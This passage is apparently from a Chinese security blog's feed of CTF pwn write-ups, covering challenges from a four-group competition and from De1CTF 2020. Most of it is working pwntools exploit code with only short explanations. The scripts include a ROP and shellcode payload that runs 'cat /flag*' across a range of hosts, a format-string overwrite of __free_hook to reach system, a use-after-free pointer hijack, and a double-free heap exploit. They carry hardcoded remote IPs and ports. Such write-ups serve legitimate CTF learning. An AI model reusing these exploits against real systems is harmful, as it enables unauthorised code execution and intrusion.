:ctx.interactive()</span><br><span class="line">rs      = <span class="keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">dbg     = <span class="keyword">lambda</span> gs=<span class="string">''</span>, **kwargs    :ctx.debug(gdbscript=gs, **kwargs)</span><br><span class="line"><span class="comment"># misc functions</span></span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line">ctx.binary = <span class="string">'pwn3'</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">False</span></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">catflag</span><span class="params">(i)</span>:</span></span><br><span class="line">sl(<span class="string">'ls'</span>)</span><br><span class="line"><span class="comment">#ru("bin")</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">r()</span><br><span class="line">sl(<span class="string">"cat /flag*"</span>)</span><br><span class="line">flag=r()</span><br><span class="line">f.write(<span class="string">"172.17.135."</span>+ip[i]+<span class="string">''</span>+flag)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">if</span>(local):</span><br><span class="line">p=rs()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">ctx.remote = (<span class="string">'123.57.225.26'</span>,<span class="number">42435</span>)</span><br><span class="line">p=rs(<span class="string">'remote'</span>)</span><br><span class="line"><span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">if</span>(local==<span class="number">1</span>):</span><br><span class="line">libc_base = ctx.bases.libc</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">ctx.symbols = &#123;<span class="string">'sym1'</span>:<span class="number">0xEDA</span> , <span class="string">'sym2'</span>:<span class="number">0x10AF</span>&#125;</span><br><span class="line">ctx.breakpoints = [<span class="number">0xEDA</span>,<span class="number">0x10AF</span>]</span><br><span class="line">ctx.debug()</span><br><span class="line"></span><br><span class="line">choice()</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">payload=<span class="string">"1"</span>*<span class="number">0x78</span>+p64(<span class="number">0x00000000004006a3</span>)+p64(<span class="number">0x601500</span>)+p64(<span class="number">0x4004D0</span>)+p64(<span class="number">0x601500</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">sl(asm(shellcraft.sh()))</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h2><span id="朱雀组">朱雀组</span></h2><h3><span id="format">format:</span></h3><p>看似很复杂，其实很简单的格式化字符串利用，改写__free_hook,直接getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :ctx.send(str(data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :ctx.sendline(str(data)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :ctx.sendlineafter(str(delim), str(data)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :ctx.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :ctx.recvuntil(delims, drop)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :ctx.interactive()</span><br><span class="line">rs      = <span class="keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">dbg     = <span class="keyword">lambda</span> gs=<span class="string">''</span>, **kwargs    :ctx.debug(gdbscript=gs, **kwargs)</span><br><span class="line"><span class="comment"># misc functions</span></span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line">ctx.binary = <span class="string">'format'</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">ctx.debug_remote_libc = <span class="literal">False</span></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">if</span>(local):</span><br><span class="line">p=rs()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">ctx.remote = (<span class="string">'59.110.243.101'</span>, <span class="number">25413</span>)</span><br><span class="line">p=rs(<span class="string">'remote'</span>)</span><br><span class="line"><span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">if</span>(local==<span class="number">1</span>):</span><br><span class="line">libc_base = ctx.bases.libc</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">ctx.symbols = &#123;<span class="string">'sym1'</span>:<span class="number">0x0FB5</span>&#125;</span><br><span class="line">ctx.breakpoints = [<span class="number">0x0FB5</span>]</span><br><span class="line">ctx.debug()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(index)</span>:</span></span><br><span class="line">sla(<span class="string">"&gt;"</span>,index)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size)</span>:</span></span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">"size: "</span>,size)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">menu(<span class="number">2</span>)</span><br><span class="line">sla(<span class="string">"id: "</span>,index)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">menu(<span class="number">3</span>)</span><br><span class="line">sla(<span class="string">"id: "</span>,index)</span><br><span class="line">sa(<span class="string">"content: "</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">menu(<span class="number">4</span>)</span><br><span class="line">sla(<span class="string">"id: "</span>,index)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(index)</span>:</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"exploition"</span></span><br><span class="line">catflag(i)</span><br><span class="line"></span><br><span class="line">choice()</span><br><span class="line">debug()</span><br><span class="line">menu(<span class="string">"vim 2"</span>)</span><br><span class="line">menu(<span class="string">"%35$p"</span>)</span><br><span class="line">menu(<span class="string">"cat 2"</span>)</span><br><span class="line">ru(<span class="string">'0x'</span>)</span><br><span class="line">libc_base=int(r(<span class="number">12</span>),<span class="number">16</span>)-(<span class="number">0x7ffff7a2d830</span><span class="number">-0x7ffff7a0d000</span>)</span><br><span class="line">leak(<span class="string">"libc_base"</span>,libc_base)</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">menu(<span class="string">"vim 2"</span>)</span><br><span class="line">menu(<span class="string">"%"</span>+str(system&amp;<span class="number">0xffff</span>)+<span class="string">"c%11$hn"</span>)</span><br><span class="line">menu(<span class="string">"cat 2aaa"</span>+p64(free_hook))</span><br><span class="line">menu(<span class="string">"vim 2"</span>)</span><br><span class="line">menu(<span class="string">"%"</span>+str((system&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)+<span class="string">"c%11$hn"</span>)</span><br><span class="line">menu(<span class="string">"cat 2aaa"</span>+p64(free_hook+<span class="number">2</span>))</span><br><span class="line">menu(<span class="string">"vim 2"</span>)</span><br><span class="line">menu(<span class="string">"%"</span>+str((system&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffff</span>)+<span class="string">"c%11$hn"</span>)</span><br><span class="line">menu(<span class="string">"cat 2aaa"</span>+p64(free_hook+<span class="number">4</span>))</span><br><span class="line">menu(<span class="string">"vim 1"</span>)</span><br><span class="line">menu(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">menu(<span class="string">"rm 1"</span>)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h3><span id="pwn3">pwn3:</span></h3><p>UAF漏洞，直接劫持puts指针为后门函数地址就可以了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :ctx.send(str(data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :ctx.sendline(str(data)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :ctx.sendlineafter(str(delim), str(data)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :ctx.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :ctx.recvuntil(delims, drop)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :ctx.interactive()</span><br><span class="line">rs      = <span class="keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">dbg     = <span class="keyword">lambda</span> gs=<span class="string">''</span>, **kwargs    :ctx.debug(gdbscript=gs, **kwargs)</span><br><span class="line"><span class="comment"># misc functions</span></span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line">ctx.binary = <span class="string">'pwn3'</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">ctx.debug_remote_libc = <span class="literal">False</span></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">if</span>(local):</span><br><span class="line">p=rs()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">ctx.remote = (<span class="string">'59.110.243.101'</span>,<span class="number">54621</span>)</span><br><span class="line">p=rs(<span class="string">'remote'</span>)</span><br><span class="line"><span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">if</span>(local==<span class="number">1</span>):</span><br><span class="line">libc_base = ctx.bases.libc</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">ctx.symbols = &#123;<span class="string">'sym1'</span>:<span class="number">0xEDA</span> , <span class="string">'sym2'</span>:<span class="number">0x10AF</span>&#125;</span><br><span class="line">ctx.breakpoints = [<span class="number">0xEDA</span>,<span class="number">0x10AF</span>]</span><br><span class="line">ctx.debug()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(index)</span>:</span></span><br><span class="line">sla(<span class="string">"Your choice :"</span>,index)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">"magic cost ?:"</span>,size)</span><br><span class="line">sa(<span class="string">"name :"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">menu(<span class="number">3</span>)</span><br><span class="line">sla(<span class="string">"index :"</span>,index)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">menu(<span class="number">2</span>)</span><br><span class="line">sla(<span class="string">"index :"</span>,index)</span><br><span class="line"></span><br><span class="line">choice()</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">"1231231"</span>)</span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">"1232123"</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x10</span>,p64(<span class="number">0x1231212</span>)+p64(<span class="number">0x400A0D</span>))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h2><span id="玄武组">玄武组</span></h2><p>个人认为本组最难，因为考研要复习，这场没有打，而且应该全部是里通过angr盲打求解来解题，个人不会。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;总的来说，我个人对这四场比赛的评价就是简单的太简单，难得太难，直接难成cve。我裂开&lt;/p&gt;
&lt;h2&gt;&lt;span id=&quot;青龙组&quot;&gt;青龙组&lt;/span&gt;&lt;/h2&gt;&lt;h3&gt;&lt;span id=&quot;boom1&quot;&gt;boom1:&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;这个就直接是个C的编译器。&lt;
      
    
    </summary>
    
    
      <category term="Writeup" scheme="http://Whali3n51.top/categories/Writeup/"/>
    
    
      <category term="UAF" scheme="http://Whali3n51.top/tags/UAF/"/>
    
      <category term="格式化字符串" scheme="http://Whali3n51.top/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
      <category term="shellcode" scheme="http://Whali3n51.top/tags/shellcode/"/>
    
      <category term="VMpwn" scheme="http://Whali3n51.top/tags/VMpwn/"/>
    
  </entry>
  
  <entry>
    <title>2020De1CTF部分pwn_Writeup</title>
    <link href="http://whali3n51.top/2020/05/06/2020De1CTF%E9%83%A8%E5%88%86pwn-Writeup/"/>
    <id>http://whali3n51.top/2020/05/06/2020De1CTF%E9%83%A8%E5%88%86pwn-Writeup/</id>
    <published>2020-05-06T05:22:37.000Z</published>
    <updated>2020-06-01T04:37:10.940Z</updated>
    
    <content type="html"><![CDATA[<p>一场令人自闭的比赛，只会做这个C++的签到题，多的不会了。可惜的是code_runner那道，没爆破出来。</p><p>这一道题还是我学弟运气好，碰出来的，vector容器free的时候，可以double free。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :ctx.send(str(data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :ctx.sendline(str(data)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :ctx.sendlineafter(str(delim), str(data)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :ctx.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :ctx.recvuntil(delims, drop)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :ctx.interactive()</span><br><span class="line">rs      = <span class="keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">dbg     = <span class="keyword">lambda</span> gs=<span class="string">''</span>, **kwargs    :ctx.debug(gdbscript=gs, **kwargs)</span><br><span class="line"><span class="comment"># misc functions</span></span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line">ctx.binary = <span class="string">'stl_container'</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">ctx.debug_remote_libc = <span class="literal">False</span></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">if</span>(local):</span><br><span class="line">p=rs()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">ctx.remote = (<span class="string">'134.175.239.26'</span>,<span class="number">8848</span>)</span><br><span class="line">p=rs(<span class="string">'remote'</span>)</span><br><span class="line"><span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">if</span>(local==<span class="number">1</span>):</span><br><span class="line">libc_base = ctx.bases.libc</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">ctx.symbols = &#123;<span class="string">'sym1'</span>:<span class="number">0xEDA</span> , <span class="string">'sym2'</span>:<span class="number">0x10AF</span>&#125;</span><br><span class="line">ctx.breakpoints = [<span class="number">0xEDA</span>,<span class="number">0x10AF</span>]</span><br><span class="line">ctx.debug()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(index)</span>:</span></span><br><span class="line">sla(<span class="string">"&gt;&gt; "</span>,index)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submenu</span><span class="params">(index)</span>:</span></span><br><span class="line">sla(<span class="string">"&gt;&gt; "</span>,index)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">List</span><span class="params">(index,tpe,data)</span>:</span></span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">submenu(tpe)</span><br><span class="line"><span class="keyword">if</span> tpe== <span class="number">1</span>:</span><br><span class="line">sa(<span class="string">"input data:"</span>,data)</span><br><span class="line"><span class="keyword">if</span> tpe== <span class="number">2</span>:</span><br><span class="line">sla(<span class="string">"index?"</span>,index)</span><br><span class="line"><span class="keyword">if</span> tpe== <span class="number">3</span>:</span><br><span class="line">sla(<span class="string">"index?"</span>,index)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Vector</span><span class="params">(index,tpe,data)</span>:</span></span><br><span class="line">menu(<span class="number">2</span>)</span><br><span class="line">submenu(tpe)</span><br><span class="line"><span class="keyword">if</span> tpe== <span class="number">1</span>:</span><br><span class="line">sa(<span class="string">"input data:"</span>,data)</span><br><span class="line"><span class="keyword">if</span> tpe== <span class="number">2</span>:</span><br><span class="line">sla(<span class="string">"index?"</span>,index)</span><br><span class="line"><span class="keyword">if</span> tpe== <span class="number">3</span>:</span><br><span class="line">sla(<span class="string">"index?"</span>,index)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Queue</span><span class="params">(index,tpe,data)</span>:</span></span><br><span class="line">menu(<span class="number">3</span>)</span><br><span class="line">submenu(tpe)</span><br><span class="line"><span class="keyword">if</span> tpe== <span class="number">1</span>:</span><br><span class="line">sa(<span class="string">"input data:"</span>,data)</span><br><span class="line"><span class="keyword">if</span> tpe== <span class="number">3</span>:</span><br><span class="line">sla(<span class="string">"index?"</span>,index)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Stack</span><span class="params">(index,tpe,data)</span>:</span></span><br><span class="line">menu(<span class="number">4</span>)</span><br><span class="line">submenu(tpe)</span><br><span class="line"><span class="keyword">if</span> tpe== <span class="number">1</span>:</span><br><span class="line">sa(<span class="string">"input data:"</span>,data)</span><br><span class="line"><span class="keyword">if</span> tpe== <span class="number">3</span>:</span><br><span class="line">sla(<span class="string">"index?"</span>,index)</span><br><span class="line">choice()</span><br><span class="line">Vector(<span class="number">1</span>,<span class="number">1</span>,<span class="string">"f"</span>*<span class="number">0x10</span>+p64(<span class="number">0xa0</span>))</span><br><span class="line">Vector(<span class="number">1</span>,<span class="number">1</span>,<span class="string">"f"</span>*<span class="number">0x10</span>+p64(<span class="number">0xa0</span>))</span><br><span class="line">List(<span class="number">1</span>,<span class="number">1</span>,<span class="string">"w"</span>*<span class="number">0x10</span>+p64(<span class="number">0xa0</span>))</span><br><span class="line">Vector(<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line">Vector(<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line">Vector(<span class="number">0</span>,<span class="number">1</span>,<span class="string">"\xf0"</span>)</span><br><span class="line">Vector(<span class="number">0</span>,<span class="number">3</span>,<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">"data: "</span>)</span><br><span class="line">heap_base=uu64(r(<span class="number">6</span>))<span class="number">-0x125e0</span></span><br><span class="line">leak(<span class="string">"heap_base"</span>,heap_base)</span><br><span class="line">Queue(<span class="number">0</span>,<span class="number">1</span>,p64(heap_base))</span><br><span class="line">Queue(<span class="number">0</span>,<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">7</span>)+p64(<span class="number">0</span>)*<span class="number">1</span>+p64(<span class="number">0xa0</span>)+p64(heap_base+<span class="number">0x20</span>)+p64(<span class="number">0</span>)*<span class="number">11</span>+p64(heap_base+<span class="number">0x20</span>))</span><br><span class="line">Vector(<span class="number">0</span>,<span class="number">3</span>,<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">"data: "</span>)</span><br><span class="line">libc_base=uu64(r(<span class="number">6</span>))-(<span class="number">0x7ffff77d7ca0</span><span class="number">-0x7ffff73ec000</span>)</span><br><span class="line">leak(<span class="string">"libc_base"</span>,libc_base)</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">List(<span class="number">1</span>,<span class="number">1</span>,p64(free_hook))</span><br><span class="line">Stack(<span class="number">0</span>,<span class="number">1</span>,p64(system))</span><br><span class="line">Vector(<span class="number">0</span>,<span class="number">1</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;一场令人自闭的比赛，只会做这个C++的签到题，多的不会了。可惜的是code_runner那道，没爆破出来。&lt;/p&gt;
